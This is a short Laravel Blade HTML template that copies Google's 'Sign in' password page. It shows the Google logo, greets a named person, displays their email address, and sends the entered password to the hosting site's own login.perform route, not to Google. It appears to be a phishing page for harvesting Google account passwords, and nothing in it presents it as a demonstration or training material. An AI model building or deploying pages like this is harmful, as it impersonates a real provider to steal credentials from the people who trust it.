<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google</title>
    <meta name="color-scheme" content="light dark">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('next.css') }}">
</head>
<body>
    <div class="login-container">
        <div class="left-section">
            <picture>
                <source srcset="{{ asset('R-dark.png')}}" media="(prefers-color-scheme: dark)">
                <img src="{{ asset('R.png')}}" alt="Google Logo" class="google-g">
            </picture>
            <h1>Hi, {{ $name }}!</h1>
            <div class="email-pill">
                <div class="initial">
                    {{ strtoupper(substr($name, 0, 1)) }}
                </div>
                <span class="email-text">{{ $email }}</span>
            </div>
        </div>
        <div class="right-section">
            <form action="{{ route('login.perform') }}" method="POST">
                @csrf
                <x-auth-validation-errors class="mb-4" :errors="$errors" />
                <div class="input-group">
                    <label for="password">Enter your password</label>
                    <input type="password" name="password" id="password" required>
                </div>
                <div class="show-password">
                    <input type="checkbox" id="showPassword" onclick="togglePassword()"> 
                    <label for="showPassword">Show password</label>
                </div>
                <div class="actions">
                    <a href="#">Forgot password?</a>
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        </div>
    </div>
    <script>
        function togglePassword() {
            var input = document.getElementById("password");
            input.type = input.type === "password" ? "text" : "password";
        }
    </script>
</body>
</html>
